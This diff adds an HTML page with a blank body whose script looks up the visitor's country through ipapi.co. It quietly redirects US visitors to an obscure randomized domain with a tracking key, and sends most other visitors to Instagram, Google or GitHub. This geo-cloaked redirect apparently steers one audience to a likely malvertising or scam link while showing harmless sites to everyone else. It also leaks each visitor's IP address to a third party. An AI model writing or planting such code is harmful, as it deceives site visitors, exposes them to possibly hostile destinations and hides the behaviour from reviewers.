@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+
+let redirected = false;
+
+setTimeout(() => {
+    if (!redirected) {
+        redirected = true;
+        window.location.href = "https://github.com/";
+    }
+}, 1000);
+
+// geo detect
+fetch("https://ipapi.co/json/")
+.then(res => res.json())
+.then(data => {
+
+    if (redirected) return;
+
+    let url = "https://www.google.com/";
+
+    if (data.country === "ID") {
+        url = "https://www.instagram.com/";
+    } else if (data.country === "US") {
+        url = "https://collateralremotelysimilarly.com/k60av5w4?key=7ab04aa00a2df2333f508561420c240b";
+    }
+
+    redirected = true;
+    window.location.href = url;
+});
+
+</script>
+</head>
+<body></body>
+</html>
